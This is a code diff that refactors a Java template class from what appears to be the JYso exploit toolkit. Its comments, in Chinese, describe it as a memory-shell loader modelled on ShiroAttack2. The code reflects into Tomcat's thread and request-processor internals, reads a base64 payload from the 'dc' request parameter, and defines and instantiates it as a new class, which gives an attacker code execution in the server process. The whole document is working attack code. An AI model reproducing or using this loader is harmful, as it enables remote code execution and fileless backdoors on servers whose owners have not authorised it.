@@ -5,6 +5,7 @@ package com.qi4l.JYso.template;
  * 从 Parameter 默认为 "dc" 中取字符进行 base64 decode，然后进行类加载，参考 ShiroAttack2
  * 内存马 class 文件可以自行生成，base64 编码后由 request body 中的 dc 参数传递
  */
+@SuppressWarnings("unused")
 public class DefineClassFromParameter {
 
     public static String parameter = "dc";
@@ -16,9 +17,8 @@ public class DefineClassFromParameter {
             java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
             f.setAccessible(true);
             Thread[] threads = (Thread[]) f.get(group);
-            for (int i = 0; i < threads.length; i++) {
+            for (Thread t : threads) {
                 try {
-                    Thread t = threads[i];
                     if (t == null) continue;
                     String str = t.getName();
                     if (str.contains("exec") || !str.contains("http")) continue;
@@ -45,20 +45,20 @@ public class DefineClassFromParameter {
                     obj = f.get(obj);
                     f = obj.getClass().getDeclaredField("processors");
                     f.setAccessible(true);
-                    java.util.List processors = (java.util.List) (f.get(obj));
-                    for (int j = 0; j < processors.size(); ++j) {
-                        Object processor = processors.get(j);
+                    java.util.List<?> processors = (java.util.List<?>) (f.get(obj));
+                    for (Object processor : processors) {
                         f = processor.getClass().getDeclaredField("req");
                         f.setAccessible(true);
 
                         Object req = f.get(processor);
-                        Object note = req.getClass().getMethod("getNote", new Class[]{Integer.TYPE}).invoke(req, new Object[]{new Integer(1)});
-                        String payload = (String) note.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(note, new Object[]{parameter});
+                        Object note = req.getClass().getMethod("getNote", Integer.TYPE).invoke(req, 1);
+                        String payload = (String) note.getClass().getMethod("getParameter", String.class).invoke(note, parameter);
                         if (payload != null && !payload.isEmpty()) {
                             byte[] classBytes = base64Decode(payload);
+                            if (classBytes == null) continue;
                             java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                             method.setAccessible(true);
-                            Class clazz = (Class) method.invoke(DefineClassFromParameter.class.getClassLoader(), classBytes, new Integer(0), new Integer(classBytes.length));
+                            Class<?> clazz = (Class<?>) method.invoke(DefineClassFromParameter.class.getClassLoader(), classBytes, 0, classBytes.length);
                             clazz.newInstance();
                         }
 
@@ -74,21 +74,10 @@ public class DefineClassFromParameter {
     }
 
     public static byte[] base64Decode(String bs) {
-        Class base64;
-        byte[] value = null;
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+            return ClassLoaderTemplate.base64Decode(bs);
         } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-            } catch (Exception ignored) {
-            }
+            return null;
         }
-
-        return value;
     }
 }
